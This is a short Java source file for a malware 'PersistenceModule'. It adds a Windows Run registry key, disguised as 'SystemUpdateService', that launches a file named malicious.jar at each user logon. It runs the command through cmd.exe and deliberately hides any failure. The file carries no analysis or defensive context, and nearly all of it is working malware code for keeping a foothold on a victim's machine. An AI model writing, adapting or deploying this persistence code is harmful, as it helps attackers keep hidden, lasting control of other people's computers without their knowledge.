import java.io.IOException;  
  
public class PersistenceModule {  
    public static void addRegistryPersistence() {  
        try {  
            // Command to add registry key  
            String cmd = String.format(  
                "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" " +  
                "/v \"SystemUpdateService\" /t REG_SZ /d \"java -jar %s\" /f",  
                new java.io.File(".").getCanonicalPath() + "\\malicious.jar" // Simplified path logic  
            );  
              
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);  
            pb.start();  
        } catch (IOException e) {  
            // Fail silently  
        }  
    }  
}  
